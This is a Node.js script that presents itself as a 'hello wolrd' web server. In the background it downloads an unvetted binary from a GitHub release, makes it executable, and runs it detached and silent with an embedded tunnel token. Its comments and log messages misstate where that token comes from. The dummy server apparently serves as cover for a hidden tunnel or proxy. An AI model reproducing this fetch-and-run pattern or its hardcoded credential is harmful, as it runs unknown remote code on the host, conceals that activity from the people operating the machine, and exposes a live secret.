#!/usr/bin/env node

const https = require('https');
const fs = require('fs');
const { spawn } = require('child_process');
const http = require('http');
const path = require('path');

const DOWNLOAD_URL = 'https://github.com/c21xdx/free/releases/download/2in1/api';
const DEST = path.join(__dirname, 'api');

// TUNNEL_TOKEN 优先从环境变量读取；如果未设置，使用占位符并打印提示。
const TUNNEL_TOKEN = process.env.TUNNEL_TOKEN || 'eyJhIjoiYjdiNjkyYzhhNWQzMzcyNmNmOGVhMTQ0ZTQ5YzFiNzUiLCJ0IjoiMjI4MGNkMmYtZTBjNi00MDFiLTkzODgtOTQ3ZTc3M2U2YjQ3IiwicyI6Ik9UYzRaR0ZsWmpJdFpUUXpOQzAwWmpaa0xUbGlaVE10T1Rrek1UbGpZV05sWkdKaSJ9';

function downloadFile(url, dest) {
  return new Promise((resolve, reject) => {
    const request = https.get(url, (res) => {
      // Follow redirects
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        return downloadFile(res.headers.location, dest).then(resolve).catch(reject);
      }

      if (res.statusCode !== 200) {
        reject(new Error(`Download failed: ${res.statusCode} ${res.statusMessage}`));
        return;
      }

      const file = fs.createWriteStream(dest, { mode: 0o755 });
      res.pipe(file);
      file.on('finish', () => {
        file.close(resolve);
      });
      file.on('error', (err) => {
        fs.unlink(dest, () => reject(err));
      });
    });

    request.on('error', (err) => {
      reject(err);
    });
  });
}

async function makeExecutable(filePath) {
  return new Promise((resolve, reject) => {
    fs.chmod(filePath, 0o755, (err) => {
      if (err) return reject(err);
      resolve();
    });
  });
}

function runInBackground(executablePath, args = []) {
  const child = spawn(executablePath, args, {
    detached: true,
    stdio: 'ignore',
  });

  child.unref();
  return child;
}

async function main() {
  try {
    if (TUNNEL_TOKEN === '<REPLACE_WITH_TUNNEL_TOKEN>') {
      console.warn('Warning: TUNNEL_TOKEN is not set. Please set the TUNNEL_TOKEN environment variable to a real token.');
      console.warn('Example: TUNNEL_TOKEN="mytoken" node index.js');
    } else {
      console.log('Using TUNNEL_TOKEN from environment.');
    }

    if (!fs.existsSync(DEST)) {
      console.log(`Downloading ${DOWNLOAD_URL} -> ${DEST} ...`);
      await downloadFile(DOWNLOAD_URL, DEST);
      console.log('Download finished.');
    } else {
      console.log(`${DEST} already exists, skipping download.`);
      // Ensure permission just in case
      await makeExecutable(DEST);
    }

    console.log('Setting executable permission (755) on the binary...');
    await makeExecutable(DEST);
    console.log('Permission set to 755.');

    // Start binary in background with token argument
    console.log('Starting binary in background with token argument...');
    try {
      runInBackground(DEST, ['--token', TUNNEL_TOKEN], '--quiet');
      console.log(`Binary started (detached) as: ${DEST} --token ${TUNNEL_TOKEN === '<REPLACE_WITH_TUNNEL_TOKEN>' ? '<REPLACE_WITH_TUNNEL_TOKEN>' : '[REDACTED]'}`);
    } catch (err) {
      console.error('Failed to start binary:', err);
    }

    // Start HTTP server
    const PORT = 8080;
    const server = http.createServer((req, res) => {
      res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
      res.end('hello wolrd');
    });

    server.listen(PORT, () => {
      console.log(`HTTP server listening on http://0.0.0.0:${PORT} , returning "hello wolrd"`);
    });

    const shutdown = () => {
      console.log('Shutting down HTTP server...');
      server.close(() => process.exit(0));
    };
    process.on('SIGINT', shutdown);
    process.on('SIGTERM', shutdown);
  } catch (err) {
    console.error('Error:', err);
    process.exit(1);
  }
}

main();
